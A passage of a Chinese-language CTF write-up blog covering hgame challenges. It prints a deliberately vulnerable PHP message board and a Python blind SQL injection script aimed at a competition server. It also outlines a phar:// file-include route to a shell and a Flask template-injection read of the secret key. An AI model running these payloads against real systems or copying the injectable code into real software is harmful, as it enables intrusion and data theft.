<span class=p>{</span>
    <span class=k>if</span> <span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;token&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;token&#39;</span><span class=p>])</span> <span class=p>{</span>
        <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;login&#39;</span><span class=p>])</span> <span class=k>and</span> <span class=nx>mb_strlen</span><span class=p>(</span><span class=nv>$message</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>6</span><span class=p>)</span> <span class=p>{</span>
            <span class=nv>$user_id</span> <span class=o>=</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;user_id&#39;</span><span class=p>];</span>
            <span class=nv>$user</span> <span class=o>=</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>];</span>
            <span class=nv>$sql_query</span> <span class=o>=</span> <span class=s2>&#34;insert into `messages`(`user_id`,`user`,`content`) VALUES(</span><span class=si>$user_id</span><span class=s2>,&#39;</span><span class=si>$user</span><span class=s2>&#39;,&#39;</span><span class=si>$message</span><span class=s2>&#39;)&#34;</span><span class=p>;</span>
            <span class=nx>sql_query</span><span class=p>(</span><span class=nv>$sql_query</span><span class=p>);</span>
        <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;login&#39;</span><span class=p>]))</span> <span class=p>{</span>
            <span class=k>echo</span> <span class=s2>&#34;login error&#34;</span><span class=p>;</span>
        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
            <span class=k>echo</span> <span class=s2>&#34;length error&#34;</span><span class=p>;</span>
        <span class=p>}</span>
    <span class=p>}</span>
<span class=p>}</span>

<span class=k>function</span> <span class=nf>delete_message</span><span class=p>(</span><span class=nv>$message_id</span><span class=p>)</span>
<span class=p>{</span>
    <span class=nv>$user_id</span> <span class=o>=</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;user_id&#39;</span><span class=p>];</span>
    <span class=k>if</span> <span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;token&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;token&#39;</span><span class=p>])</span> <span class=p>{</span>
        <span class=k>if</span> <span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;groups&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
            <span class=nv>$sql_query</span> <span class=o>=</span> <span class=s2>&#34;delete from `messages` where `message_id`=</span><span class=si>$message_id</span><span class=s2> and `user_id`=</span><span class=si>$user_id</span><span class=s2>&#34;</span><span class=p>;</span>
        <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;groups&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
            <span class=nv>$sql_query</span> <span class=o>=</span> <span class=s2>&#34;delete from `messages` where `message_id`=</span><span class=si>$message_id</span><span class=s2>&#34;</span><span class=p>;</span>
        <span class=p>}</span>
        <span class=nx>sql_query</span><span class=p>(</span><span class=nv>$sql_query</span><span class=p>);</span>

    <span class=p>}</span>
<span class=p>}</span>

<span class=k>function</span> <span class=nf>rand_filename</span><span class=p>()</span>
<span class=p>{</span>
    <span class=nv>$tmp</span> <span class=o>=</span> <span class=sb>`cat /dev/urandom | head -n 10 | md5sum | head -c 15`</span><span class=p>;</span>
    <span class=nv>$sql_query</span> <span class=o>=</span> <span class=s2>&#34;select `avatar` from `users` where `avatar`=</span><span class=si>$tmp</span><span class=s2>&#34;</span><span class=p>;</span>
    <span class=nv>$res</span> <span class=o>=</span> <span class=nx>sql_query</span><span class=p>(</span><span class=nv>$sql_query</span><span class=p>);</span>
    <span class=k>if</span> <span class=p>(</span><span class=nv>$res</span><span class=o>-&gt;</span><span class=na>num_rows</span><span class=p>)</span> <span class=p>{</span>
        <span class=k>return</span> <span class=nx>rand_filename</span><span class=p>();</span>
    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
        <span class=k>return</span> <span class=nv>$tmp</span><span class=p>;</span>
    <span class=p>}</span>
<span class=p>}</span>

<span class=k>function</span> <span class=nf>upload_avatar</span><span class=p>()</span>
<span class=p>{</span>
    <span class=nv>$type</span> <span class=o>=</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;type&#39;</span><span class=p>];</span>
    <span class=nv>$user_id</span> <span class=o>=</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;user_id&#39;</span><span class=p>];</span>
    <span class=k>if</span> <span class=p>(</span><span class=nv>$type</span> <span class=o>==</span> <span class=s1>&#39;image/gif&#39;</span> <span class=o>||</span> <span class=nv>$type</span> <span class=o>==</span> <span class=s1>&#39;image/jpeg&#39;</span> <span class=o>||</span> <span class=nv>$type</span> <span class=o>==</span> <span class=s1>&#39;image/png&#39;</span><span class=p>)</span> <span class=p>{</span>
        <span class=nv>$avatar</span> <span class=o>=</span> <span class=nx>get_avatar</span><span class=p>(</span><span class=nv>$user_id</span><span class=p>);</span>
        <span class=k>if</span> <span class=p>(</span><span class=nv>$avatar</span> <span class=o>==</span> <span class=k>null</span><span class=p>)</span> <span class=p>{</span>
            <span class=nv>$name</span> <span class=o>=</span> <span class=nx>rand_filename</span><span class=p>();</span>
            <span class=nx>move_uploaded_file</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>],</span> <span class=s2>&#34;./img/avatar/&#34;</span> <span class=o>.</span> <span class=nv>$name</span> <span class=o>.</span> <span class=s2>&#34;.png&#34;</span><span class=p>);</span>
            <span class=nv>$sql_query</span> <span class=o>=</span> <span class=s2>&#34;update `users` set `avatar`=&#39;</span><span class=si>$name</span><span class=s2>&#39; WHERE `user_id`=</span><span class=si>$user_id</span><span class=s2>&#34;</span><span class=p>;</span>
            <span class=nx>sql_query</span><span class=p>(</span><span class=nv>$sql_query</span><span class=p>);</span>
        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
            <span class=nx>move_uploaded_file</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>],</span> <span class=s2>&#34;./img/avatar/&#34;</span> <span class=o>.</span> <span class=nv>$avatar</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>]</span> <span class=o>.</span> <span class=s2>&#34;.png&#34;</span><span class=p>);</span>

        <span class=p>}</span>
    <span class=p>}</span>
<span class=p>}</span>

<span class=k>function</span> <span class=nf>change_password</span><span class=p>(</span><span class=nv>$opassword</span><span class=p>,</span> <span class=nv>$npassword</span><span class=p>,</span> <span class=nv>$npasswod_again</span><span class=p>)</span>
<span class=p>{</span>
    <span class=k>if</span> <span class=p>(</span><span class=nx>judge</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>],</span> <span class=nv>$npassword</span><span class=p>))</span> <span class=p>{</span>
        <span class=k>if</span> <span class=p>(</span><span class=nv>$npasswod_again</span> <span class=o>!==</span> <span class=nv>$npassword</span><span class=p>)</span> <span class=p>{</span>
            <span class=k>echo</span> <span class=s2>&#34;difference error&#34;</span><span class=p>;</span>
        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
            <span class=nv>$user_id</span> <span class=o>=</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;user_id&#39;</span><span class=p>];</span>
            <span class=nv>$sql_query</span> <span class=o>=</span> <span class=s2>&#34;select `password` from `users` where `user_id`=</span><span class=si>$user_id</span><span class=s2>&#34;</span><span class=p>;</span>
            <span class=nv>$res</span> <span class=o>=</span> <span class=nx>sql_query</span><span class=p>(</span><span class=nv>$sql_query</span><span class=p>);</span>
            <span class=k>if</span> <span class=p>(</span><span class=nv>$res</span><span class=o>-&gt;</span><span class=na>num_rows</span><span class=p>)</span> <span class=p>{</span>
                <span class=k>if</span> <span class=p>(</span><span class=nv>$res</span><span class=o>-&gt;</span><span class=na>fetch_row</span><span class=p>()[</span><span class=mi>0</span><span class=p>]</span> <span class=o>===</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$opassword</span><span class=p>))</span> <span class=p>{</span>
                    <span class=nv>$sql_query</span> <span class=o>=</span> <span class=s2>&#34;update `users` set `password`=md5(</span><span class=si>$npassword</span><span class=s2>) WHERE `user_id`=</span><span class=si>$user_id</span><span class=s2>&#34;</span><span class=p>;</span>
                    <span class=nv>$res</span> <span class=o>=</span> <span class=nx>sql_query</span><span class=p>(</span><span class=nv>$sql_query</span><span class=p>);</span>
                    <span class=k>echo</span> <span class=nv>$res</span><span class=p>;</span>
                    <span class=k>echo</span> <span class=s2>&#34;successful&#34;</span><span class=p>;</span>
                <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
                    <span class=k>echo</span> <span class=s2>&#34;oldpassword error&#34;</span><span class=p>;</span>
                <span class=p>}</span>
            <span class=p>}</span>
        <span class=p>}</span>

    <span class=p>}</span>

<span class=p>}</span>
</code></pre></div><p>Message.php</p>
<pre tabindex=0><code class=language-php+HTML data-lang=php+HTML>&lt;h1 class=&quot;title&quot; id=&quot;title&quot;&gt;Message Board&lt;/h1&gt;
&lt;div id=&quot;container&quot; class=&quot;am-container&quot;&gt;&lt;/div&gt;
&lt;div id=&quot;rocket&quot; class=&quot;am-icon-btn&quot; onclick=&quot;ReturnTop()&quot;&gt;&lt;/div&gt;
&lt;div id=&quot;write_message&quot; class=&quot;am-icon-btn&quot;&gt;&lt;/div&gt;
&lt;div class=&quot;am-modal am-modal-prompt&quot; tabindex=&quot;-1&quot; id=&quot;my-prompt&quot;&gt;
    &lt;div class=&quot;am-modal-dialog am-form&quot; id=&quot;message_area&quot;&gt;
        &lt;div class=&quot;am-modal-hd&quot;&gt;写留言&lt;/div&gt;
        &lt;div class=&quot;am-modal-bd&quot;&gt;
            &lt;textarea class='textarea' name=&quot;new_message&quot; id=&quot;new_message&quot; cols=&quot;30&quot; rows=&quot;10&quot;&gt;&lt;/textarea&gt;&lt;br&gt;
        &lt;/div&gt;
        &lt;div class=&quot;am-modal-footer&quot;&gt;
            &lt;button class=&quot;am-btn am-btn-danger button &quot; id=&quot;button_cancel&quot; data-am-modal-cancel&gt;取 消
            &lt;/button&gt;
            &lt;button class=&quot;am-btn am-btn-primary button &quot; id=&quot;button_sumbit&quot;
                    data-am-modal-confirm&gt;
                提 交
                留 言
            &lt;/button&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;
&lt;script src='/js/index.js'&gt;&lt;/script&gt;
</code></pre><p>Config.php</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
<span class=nv>$DBHOST</span> <span class=o>=</span> <span class=s2>&#34;127.0.0.1&#34;</span><span class=p>;</span>
<span class=nv>$DBUSER</span> <span class=o>=</span> <span class=nx>getenv</span><span class=p>(</span><span class=s1>&#39;DATABASE_USER&#39;</span><span class=p>);</span>
<span class=nv>$DBPASS</span> <span class=o>=</span> <span class=nx>getenv</span><span class=p>(</span><span class=s1>&#39;DATABASE_PASS&#39;</span><span class=p>);</span>
<span class=nv>$DBNAME</span> <span class=o>=</span> <span class=s2>&#34;lyb&#34;</span><span class=p>;</span>
<span class=nv>$mysqli</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>mysqli</span><span class=p>(</span><span class=nv>$DBHOST</span><span class=p>,</span> <span class=nv>$DBUSER</span><span class=p>,</span> <span class=nv>$DBPASS</span><span class=p>,</span> <span class=nv>$DBNAME</span><span class=p>);</span>
<span class=cp>?&gt;</span><span class=err>
</span></code></pre></div><p>Login.php</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
<span class=k>require_once</span><span class=p>(</span><span class=s1>&#39;functions.php&#39;</span><span class=p>);</span>
<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>])</span> <span class=k>or</span> <span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]))</span> <span class=p>{</span>
    <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;loginout&#39;</span><span class=p>]))</span> <span class=p>{</span>
        <span class=nx>loginout</span><span class=p>();</span>
    <span class=p>}</span>
    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;login&#39;</span><span class=p>]))</span> <span class=p>{</span>
        <span class=k>include</span><span class=p>(</span><span class=s1>&#39;template/login.html&#39;</span><span class=p>);</span>
        <span class=nx>csrf_token</span><span class=p>();</span>
    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
        <span class=nx>Header</span><span class=p>(</span><span class=s1>&#39;Location: /index.php&#39;</span><span class=p>);</span>
    <span class=p>}</span>
<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
    <span class=nx>login</span><span class=p>(</span><span class=nx>addslashes</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]),</span> <span class=nx>addslashes</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]),</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;token&#39;</span><span class=p>]);</span>
<span class=p>}</span>
</code></pre></div><p>index.php</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
<span class=k>include_once</span><span class=p>(</span><span class=s2>&#34;template/header.php&#34;</span><span class=p>);</span>
<span class=k>if</span> <span class=p>(</span><span class=nx>is_null</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;user_id&#39;</span><span class=p>]))</span> <span class=p>{</span>
    <span class=nx>header</span><span class=p>(</span><span class=s1>&#39;Location:/login.php&#39;</span><span class=p>);</span>
    <span class=k>exit</span><span class=p>();</span>
<span class=p>}</span>
<span class=nv>$page</span> <span class=o>=</span> <span class=nx>array_key_exists</span><span class=p>(</span><span class=s1>&#39;action&#39;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>)</span> <span class=o>?</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;action&#39;</span><span class=p>]</span> <span class=o>:</span> <span class=s1>&#39;message&#39;</span><span class=p>;</span>
<span class=k>require</span> <span class=nv>$page</span> <span class=o>.</span><span class=s1>&#39;.php&#39;</span><span class=p>;</span>
<span class=k>include_once</span><span class=p>(</span><span class=s2>&#34;template/footer.php&#34;</span><span class=p>);</span>
<span class=cp>?&gt;</span><span class=err>
</span></code></pre></div><p>Message_api.php</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
<span class=k>require_once</span><span class=p>(</span><span class=s1>&#39;functions.php&#39;</span><span class=p>);</span>
<span class=k>if</span> <span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;action&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=s1>&#39;add&#39;</span><span class=p>)</span> <span class=p>{</span>
    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;new_message&#39;</span><span class=p>])</span> <span class=k>or</span> <span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;token&#39;</span><span class=p>]))</span> <span class=p>{</span>
        <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Location: /index.php&#34;</span><span class=p>);</span>
    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
        <span class=nx>add_message</span><span class=p>(</span><span class=nx>htmlspecialchars</span><span class=p>(</span><span class=nx>addslashes</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;new_message&#39;</span><span class=p>])));</span>
    <span class=p>}</span>
<span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;action&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=s1>&#39;delete&#39;</span><span class=p>)</span> <span class=p>{</span>
    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;message_id&#39;</span><span class=p>])</span> <span class=k>or</span> <span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;token&#39;</span><span class=p>]))</span> <span class=p>{</span>
        <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Location: /index.php&#34;</span><span class=p>);</span>
    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
        <span class=nx>delete_message</span><span class=p>(</span><span class=nx>addslashes</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;message_id&#39;</span><span class=p>]));</span>
    <span class=p>}</span>
<span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;action&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=s1>&#39;get_new&#39;</span><span class=p>)</span> <span class=p>{</span>
    <span class=k>if</span> <span class=p>(</span><span class=nx>is_null</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;user_id&#39;</span><span class=p>]))</span> <span class=p>{</span>
        <span class=nx>http_response_code</span><span class=p>(</span><span class=mi>403</span><span class=p>);</span>
    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
        <span class=k>echo</span> <span class=nx>get_new_messages</span><span class=p>();</span>
    <span class=p>}</span>
<span class=p>}</span> <span class=k>elseif</span>
<span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;action&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=s1>&#39;get&#39;</span><span class=p>)</span> <span class=p>{</span>
    <span class=k>if</span> <span class=p>(</span><span class=nx>is_null</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;user_id&#39;</span><span class=p>]))</span> <span class=p>{</span>
        <span class=nx>http_response_code</span><span class=p>(</span><span class=mi>403</span><span class=p>);</span>
    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
        <span class=k>echo</span> <span class=nx>get_messages</span><span class=p>();</span>
    <span class=p>}</span>
<span class=p>}</span>
</code></pre></div><p>在<code>functions.php</code>中我们可以看到一个明显的注入</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=k>function</span> <span class=nf>delete_message</span><span class=p>(</span><span class=nv>$message_id</span><span class=p>)</span>
<span class=p>{</span>
    <span class=nv>$user_id</span> <span class=o>=</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;user_id&#39;</span><span class=p>];</span>
    <span class=k>if</span> <span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;token&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;token&#39;</span><span class=p>])</span> <span class=p>{</span>
        <span class=k>if</span> <span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;groups&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
            <span class=nv>$sql_query</span> <span class=o>=</span> <span class=s2>&#34;delete from `messages` where `message_id`=</span><span class=si>$message_id</span><span class=s2> and `user_id`=</span><span class=si>$user_id</span><span class=s2>&#34;</span><span class=p>;</span>
        <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;groups&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
            <span class=nv>$sql_query</span> <span class=o>=</span> <span class=s2>&#34;delete from `messages` where `message_id`=</span><span class=si>$message_id</span><span class=s2>&#34;</span><span class=p>;</span>
        <span class=p>}</span>
        <span class=nx>sql_query</span><span class=p>(</span><span class=nv>$sql_query</span><span class=p>);</span>

    <span class=p>}</span>
<span class=p>}</span>
</code></pre></div><p>我们就可以从<code>$message_id</code>进行注入。然而这个注入可以搭配什么进行攻击呢，既然首页有文件包含，我们是不是可以利用上传头像来进行包含利用，这个<code>sql</code>注入就可以帮助我们获得头像文件名了。</p>
<p>大致思路就出来了，通过头像上传，然后使用注入获得路径，在用<code>phar://xxxx/xxxx</code>来访问拿到<code>shell</code></p>
<p>这里不知道为什么访问有点问题，贴一下一叶飘零师傅的 jio 本好了：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>import</span> <span class=nn>requests</span>
<span class=kn>import</span> <span class=nn>re</span>
<span class=n>flag</span><span class=o>=</span><span class=s1>&#39;&#39;</span>
<span class=n>res</span> <span class=o>=</span> <span class=s2>&#34;&lt;input type=&#39;hidden&#39; value=&#39;(.*?)&#39; id=&#39;token&#39;&#34;</span>
<span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://111.231.140.29:10080/index.php&#39;</span>
<span class=n>header</span><span class=o>=</span><span class=p>{</span>
    <span class=s1>&#39;User-Agent&#39;</span><span class=p>:</span><span class=s1>&#39;curl/7.54.0&#39;</span><span class=p>,</span>
    <span class=s1>&#39;Accept&#39;</span><span class=p>:</span><span class=s1>&#39;*/*&#39;</span>
<span class=p>}</span>
<span class=n>cookie</span> <span class=o>=</span> <span class=p>{</span>
    <span class=s1>&#39;PHPSESSID&#39;</span><span class=p>:</span><span class=s1>&#39;mobe47sd6q6ocl6g9upcok0ad8&#39;</span><span class=p>,</span>
    <span class=s1>&#39;user&#39;</span><span class=p>:</span><span class=s1>&#39;zeddy&#39;</span><span class=p>,</span>
    <span class=s1>&#39;groups&#39;</span><span class=p>:</span><span class=s1>&#39;0&#39;</span>
<span class=p>}</span>
<span class=n>url2</span> <span class=o>=</span> <span class=s1>&#39;http://111.231.140.29:10080/messages_api.php?action=delete&#39;</span>
<span class=n>url4</span> <span class=o>=</span> <span class=s1>&#39;http://111.231.140.29:10080/messages_api.php?action=add&#39;</span>
<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>1000</span><span class=p>):</span>
    <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
    <span class=c1># for j in range(33,127):</span>
    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=s1>&#39;0123456789abcdef&#39;</span><span class=p>:</span>
        <span class=n>j</span> <span class=o>=</span> <span class=nb>ord</span><span class=p>(</span><span class=n>j</span><span class=p>)</span>
        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=n>cookie</span><span class=p>,</span><span class=n>headers</span><span class=o>=</span><span class=n>header</span><span class=p>)</span>
        <span class=n>token</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=n>res</span><span class=p>,</span> <span class=n>r</span><span class=o>.</span><span class=n>content</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))[</span><span class=mi>0</span><span class=p>]</span>
        <span class=c1>#payload = &#34;-1 or if((ascii(substr((database()),%d,1))=%d),sleep(5),0)#&#34;%(i,j)</span>
        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;-1 or if((ascii(substr((select avatar from users where username like 0x7a65646479),</span><span class=si>%d</span><span class=s2>,1))=</span><span class=si>%d</span><span class=s2>),sleep(3),0)#&#34;</span><span class=o>%</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=n>j</span><span class=p>)</span>
        <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
            <span class=s1>&#39;message_id&#39;</span><span class=p>:</span><span class=n>payload</span><span class=p>,</span>
            <span class=s1>&#39;token&#39;</span><span class=p>:</span><span class=n>token</span>
        <span class=p>}</span>
        <span class=k>try</span><span class=p>:</span>
            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span><span class=n>cookies</span><span class=o>=</span><span class=n>cookie</span><span class=p>,</span><span class=n>url</span><span class=o>=</span><span class=n>url2</span><span class=p>,</span><span class=n>timeout</span><span class=o>=</span><span class=mf>2.5</span><span class=p>,</span><span class=n>headers</span><span class=o>=</span><span class=n>header</span><span class=p>)</span>
        <span class=k>except</span><span class=p>:</span>
            <span class=n>flag</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>j</span><span class=p>)</span>
            <span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=n>cookie</span><span class=p>,</span><span class=n>headers</span><span class=o>=</span><span class=n>header</span><span class=p>)</span>
            <span class=n>token</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=n>res</span><span class=p>,</span> <span class=n>r</span><span class=o>.</span><span class=n>content</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))[</span><span class=mi>0</span><span class=p>]</span>
            <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
                <span class=s1>&#39;new_message&#39;</span><span class=p>:</span> <span class=s1>&#39;123456&#39;</span><span class=p>,</span>
                <span class=s1>&#39;token&#39;</span><span class=p>:</span> <span class=n>token</span>
            <span class=p>}</span>
            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span><span class=n>cookies</span><span class=o>=</span><span class=n>cookie</span><span class=p>,</span><span class=n>url</span><span class=o>=</span><span class=n>url4</span><span class=p>,</span><span class=n>headers</span><span class=o>=</span><span class=n>header</span><span class=p>)</span>
            <span class=k>break</span>
</code></pre></div><h4 id=babyxss>BabyXSS</h4>
<blockquote>
<p>save 按钮尝试 xss(尝试过程不需要输验证码)，成功后带上验证码 code，submit 按钮提交 xss 语句；flag 在 admin 的 cookie 里面,格式 hgame{xxxxx}。</p>
<p>http://118.25.18.223:9000/index.php</p>
</blockquote>
<p>一直访问不了 233</p>
<p>参考其他师傅的 wp ，只是一个简单的双写关键字绕过</p>
<h2 id=week-4>Week 4</h2>
<h3 id=web-3>Web</h3>
<h4 id=happypython>happyPython</h4>
<blockquote>
<p>flag 在管理员账号下</p>
<p>http://118.25.18.223:3001</p>
</blockquote>
<p>思路主要是伪造 admin cookiel 了，所以我们需要读<code>secret_key</code></p>
<p>使用
{% raw %}
/{{[].<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()}} 与 /{{[].<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>}}
{% endraw %}
两个返回均相同</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005995.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005995.jpg loading=lazy>
</a>
</figure></p>
<p>发现是<code>()</code>被过滤了</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001230.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001230.jpg loading=lazy>
</a>
</figure></p>
<p>一直想着去用文件读取<code>secret_key</code>，但是又因为<code>()</code>被过滤，怎么也做不出来</p>
<p>后来发现用<code>/{{config}}</code>可以得到…….orz，也可以用<code>url_for.__globals__['current_app'].config</code>读取</p>
